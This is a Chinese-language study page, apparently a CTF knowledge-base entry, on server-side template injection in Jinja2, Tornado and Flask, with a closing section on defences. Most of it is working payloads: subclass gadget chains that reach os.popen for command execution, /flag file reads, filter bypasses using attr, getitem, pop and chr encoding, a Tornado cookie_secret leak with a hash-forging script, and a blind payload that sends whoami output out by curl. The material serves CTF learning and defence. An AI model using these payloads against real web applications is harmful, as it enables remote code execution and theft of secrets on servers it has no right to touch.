---
title: Python SSTI 多引擎利用与黑名单绕过技巧
description: 系统梳理 Jinja2、Tornado、Flask 三大 Python 模板引擎的 SSTI 利用与黑名单绕过技巧，覆盖 {{handler.settings}}
  泄露 cookie_secret、url_for/get_flashed_messages 绕过 config/self 黑名单、__class__.__mro__.__subclasses__()
  通用调用链、利用 __getitem__/pop 绕过括号中括号逗号过滤、chr 编码绕过引号、{% if %} 盲注绕过双大括号、url_for._globals_
  信息泄露等实战 Payload
category: program-analysis
tags:
- Python
- SSTI
- Jinja2
- Tornado
- Flask
- 模板注入
- 黑名单绕过
- CTF
- 攻防世界
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

服务器端模板注入（SSTI）是指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。类比 SQL 注入，SSTI 也是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。主要针对 Python、PHP、Java 的一些网站处理框架。

**常见 Python 模板引擎**：Jinja2、Mako、Tornado、Django

**危害**：可能导致敏感信息泄露、代码执行、GetShell 等问题

## Jinja2 模板引擎 SSTI

### 基础语法

| 语法 | 说明 |
|------|------|
| `{{ ... }}` | 装载一个变量，模板渲染时使用传入的同名参数替换 |
| `{# ... #}` | 装载一个注释，模板渲染时会忽略中间的值 |
| `{% ... %}` | 控制结构（循环、条件判断等） |

### 通用调用链：`__class__.__mro__.__subclasses__()`

Jinja2 环境下最通用的利用链，通过访问对象基类遍历所有子类找到可利用的 gadget。

#### 核心 Payload

```jinja2
# 列出所有子类及索引
{{ [].__class__.__base__.__subclasses__() }}

# 典型利用链：site._Printer (索引 71) 或 warnings.catch_warnings (索引 59)
{{ [].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat flag').read() }}
```

#### 自动化搜索 Payload（攻防世界 `Web_python_template_injection`）

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %}
{% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{ b['eval']('__import__("os").popen("ls").read()') }}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
```

> **实战案例**：[[attack-defense-world-master-advanced-writeup]] 中 `Web_python_template_injection` 题目即为 Jinja2 环境，利用 `catch_warnings` 类调用 `os.popen` 读取 flag。

### 进阶利用技巧

- **文件读取**：`{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}`（Flask 环境）
- **命令执行**：`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
- **绕过过滤**：使用 `|attr` 过滤器、`|string` 拼接、`request.args.xxx` 传参

## Tornado 模板引擎 SSTI

### 框架特性

Tornado 是 Python 编写的 Web 服务器兼 Web 应用框架。其模板语法与 Jinja2 类似，但对象模型不同。

### 关键信息泄露：`{{ handler.settings }}`

在 Tornado 中，`RequestHandler` 对象可通过 `handler` 访问。`handler.settings` 指向 `Application.settings`，其中包含 `cookie_secret` 等敏感配置。

> **实战案例**：[[attack-defense-world-master-advanced-writeup]] 中 `easytornado` 题目

#### 利用流程

1. **探测模板注入点**
   ```http
   GET /error?msg={{ 8*8 }}
   ```

2. **泄露 `cookie_secret`**
   ```http
   GET /error?msg={{ handler.settings }}
   ```
   返回包含 `"cookie_secret": "xxxxxxxx"` 的字典。

3. **构造文件读取签名**
   - 目标文件：`/fllllllllllllag`
   - 计算 `filehash = md5(md5(filename) + cookie_secret)`
   - 访问 `/file?filename=/fllllllllllllag&filehash=<计算值>`

#### 完整利用脚本示例

```python
import hashlib

cookie_secret = "泄露的cookie_secret值"
filename = "/fllllllllllllag"

# Tornado 逻辑：md5(md5(filename) + cookie_secret)
inner_md5 = hashlib.md5(filename.encode()).hexdigest()
filehash = hashlib.md5((inner_md5 + cookie_secret).encode()).hexdigest()

print(f"filehash: {filehash}")
# 访问 /file?filename=/fllllllllllllag&filehash={filehash}
```

## Flask 模板引擎 SSTI 与黑名单绕过

### 内置全局对象

Flask 模板上下文中自动注入以下对象，可直接调用：

| 对象 | 说明 |
|------|------|
| `config` | 当前配置对象 (`flask.config.Config`) |
| `request` | 当前请求对象 |
| `session` | 会话对象 |
| `g` | 请求级全局变量 |
| `url_for` | URL 构建函数，**可访问 `__globals__`** |
| `get_flashed_messages` | 闪现消息获取函数，**可访问 `__globals__`** |

### 黑名单绕过案例：`shrine` 题目

> **实战案例**：[[attack-defense-world-master-advanced-writeup]] 中 `shrine` 题目

#### 过滤规则分析

```python
def safe_jinja(s):
    s = s.replace('(', '').replace(')', '')  # 过滤括号
    blacklist = ['config', 'self']            # 黑名单
    return ''.join(['{{% set {}=None %}}'.format(c) for c in blacklist]) + s
```

- 括号 `()` 被替换为空 → 无法直接调用 `__subclasses__()`
- `config` 和 `self` 被设为 `None` → 无法直接访问

#### 绕过思路

1. **黑名单匹配是精确匹配**：`XXX.config` 不会被替换
2. **利用 Flask 内置函数访问 `__globals__`**：
   - `url_for.__globals__`
   - `get_flashed_messages.__globals__`

#### 核心 Payload

```jinja2
# 1. 获取 current_app 配置对象（绕过 config 黑名单）
{{ url_for.__globals__.current_app.config }}

# 2. 读取环境变量 FLAG
{{ url_for.__globals__.current_app.config.FLAG }}

# 3. 或者通过 get_flashed_messages
{{ get_flashed_messages.__globals__.current_app.config.FLAG }}
```

#### 进阶：无括号调用 `__subclasses__`

由于 `()` 被过滤，可利用 Jinja2 的 `|attr` 过滤器或 `[]` 语法：

```jinja2
# 使用 |attr 调用方法
{{ [].__class__.__base__.__subclasses__|attr('__getitem__')(71) }}

# 使用 request.args 传参绕过
{{ request.args.a|attr(request.args.b) }}  # ?a=[]&b=__class__.__base__.__subclasses__
```

### 补充绕过技巧（XD安全 Day83-85 笔记）

#### 利用 `url_for._globals_` 信息泄露

直接访问 `url_for._globals_` 可泄露全局命名空间，包含 `current_app` 等敏感对象：

```jinja2
{{ url_for._globals_ }}
{{ url_for._globals_['current_app'].config }}
```

#### 绕过括号 `()` 过滤：`__getitem__` 与 `pop`

利用 `__getitem__` 替代 `[]` 下标访问，利用 `pop` 替代索引获取并移除元素：

```jinja2
# 绕过 __bases__[0] -> __bases__.__getitem__(0)
# 绕过 __subclasses__()[128] -> __subclasses__().__getitem__(128) 或 __subclasses__().pop(128)

"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()
```

#### 绕过引号过滤：`chr` 编码拼接

利用 `__builtins__.chr` 将字符串转为 ASCII 码拼接，避免直接出现引号：

```jinja2
{% set chr= ().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}
{{ ().__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.os.popen(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)).read() }}
```

#### 绕过双大括号 `{{ }}`：`{% if %}` 盲注

利用模板控制结构 `{% if %}` 进行布尔盲注，逐字符提取命令执行结果：

```jinja2
{% if ''.__class__.__bases__.__getitem__(0).__subclasses__().pop(250).__init__.__globals__.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

> **原理**：通过外带 DNS/HTTP 请求将命令执行结果逐字符判断，配合 `{% if %}` 条件输出 `1` 确认字符匹配。

#### 绕过中括号 `[]` 与逗号 `,` 组合过滤

结合 `__getitem__` 与 `pop` 链式调用，完全避开 `[]` 和 `,`：

```jinja2
"".__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(128).__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

---

## Python 格式化字符串漏洞（Format String Vulnerability）

> **来源**：XD安全 Day83-85 学习笔记

Python 多种字符串格式化方式若用户可控格式化字符串，均可能导致敏感信息泄露或代码执行。

### `%` 操作符（经典格式化）

```python
>>> name = 'Bob'
>>> 'Hello, %s' % name
"Hello, Bob"
```

### `string.Template`（标准库模板）

```python
>>> from string import Template
>>> t = Template('Hey, $name!')
>>> t.substitute(name='Bob')
'Hey, Bob!'
```

### `str.format()` 方法（Python 3+，高风险）

**危害**：可访问对象属性、调用方法、遍历 `__globals__` 实现 RCE。

```python
# 示例：格式化字符串可控导致敏感数据泄露
>>> class Config:
...     SECRET = 'flag{xxx}'
... 
>>> config = Config()
>>> '{}'.format(config.__class__.__mro__[1].__subclasses__())
# 可进一步构造 RCE 链
```

### f-Strings（Python 3.6+，最高风险）

**危害**：表达式直接在 `{}` 中求值，可执行任意代码。

```python
>>> f'{__import__("os").system("id")}'
uid=0(root) gid=0(root) groups=0(root)
'0'
```

> **防御**：严禁将用户输入直接作为格式化字符串模板；使用 `string.Template` 或仅允许数据插值而非表达式求值的安全模板引擎。

---

## 三大引擎对比速查表

| 特性 | Jinja2 (Flask 默认) | Tornado | Mako |
|------|---------------------|---------|------|
| 变量输出 | `{{ var }}` | `{{ var }}` | `${ var }` |
| 控制结构 | `{% if %}` | `{% if %}` | `% if` |
| 访问配置 | `config` / `request.config` | `handler.settings` | `context.get('config')` |
| 通用调用链 | `__class__.__mro__.__subclasses__()` | `handler.settings` 信息泄露 | `<% import os; os.system('id') %>` |
| 典型绕过 | `|attr`、`request.args`、内置函数 `__globals__`、`__getitem__`/`pop`、`chr` 编码、`{% if %}` 盲注 | `datetime` 模块测试参数 | `%` 指令注入 |

---

## 实战检测与利用清单

### 快速探测 Payload

```jinja2
# 通用数学运算测试
{{ 7*7 }}
{{ 7*'7' }}  # Jinja2/Tornado: '7777777', Mako: 报错

# 引擎指纹识别
{{ ''.__class__.__mro__ }}           # Jinja2
{{ handler.settings }}               # Tornado
{{ config }} / {{ url_for.__globals__ }}  # Flask
```

### 通用 RCE 链构造步骤

1. **确认注入点与引擎类型**
2. **寻找可控对象**：`[]`、`''`、`{}`、`request`、`handler`、`config`
3. **遍历 `__subclasses__` 定位 gadget**：
   - `subprocess.Popen` / `os.popen` / `os.system`
   - `builtins.__import__('os').popen`
   - `eval` / `exec` 所在命名空间
4. **构造最终 Payload 执行命令/读文件**

### 自动化工具推荐

- **tplmap**：自动化 SSTI 检测与利用
- **SSTImap**：支持多引擎检测
- **Burp Suite 插件**：SSTI Scanner

---

## 防御建议

1. **沙箱化模板环境**：Jinja2 启用 `SandboxedEnvironment`
2. **禁用危险方法**：移除 `__class__`、`__mro__`、`__subclasses__`、`__globals__`、`__getitem__`、`pop` 等属性访问
3. **输入验证与输出编码**：严格校验用户输入，避免直接拼接进模板
4. **最小权限原则**：模板渲染进程降权，禁用 `os`、`subprocess` 等模块
5. **日志审计**：记录模板渲染异常与敏感属性访问
6. **格式化字符串安全**：禁止用户控制格式化模板字符串；优先使用 `string.Template` 或显式参数绑定

---

## 相关页面

- [[attack-defense-world-master-advanced-writeup]] — 攻防世界高手进阶区完整 Writeup，含本页面引用的三道 SSTI 题目原始复现过程
- [[php伪协议与反序列化利用]] — PHP 伪协议与反序列化利用技巧，对比不同语言模板/反序列化攻击面
- [[ctf-show-php-command-execution-bypass-techniques]] — PHP 命令执行绕过技术，对比 SSTI 与传统 RCE 的利用差异
- [[xd-security-ctf-flag-notes-day83-85]] — XD安全 Day83-85 学习笔记原文，含序列化、SSTI、Python 格式化字符串、PHP 弱类型/preg_match 绕过、RCE、反序列化、Java WEB-INF/XXE/反编译等内容

---

## 参考资源

- [细说服务器端模板注入（SSTI）](https://paper.seebug.org/1408/)
- [一篇文章带你理解漏洞之 SSTI 漏洞](https://xz.aliyun.com/t/10243)
- [Jinja2 官方文档 - Sandbox](https://jinja.palletsprojects.com/en/stable/api/#sandbox)
- [Tornado 模板文档](https://www.tornadoweb.org/en/stable/template.html)
- [Flask 模板上下文](https://flask.palletsprojects.com/en/stable/templating/#standard-context)

---

## 来源

- [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
- XD安全公众号《XD安全 学习笔记 | CTF夺旗》Day83-85 学习笔记
- [0x00实验室-202108-202304_097](../sources/0x00实验室-202108-202304_097.md)
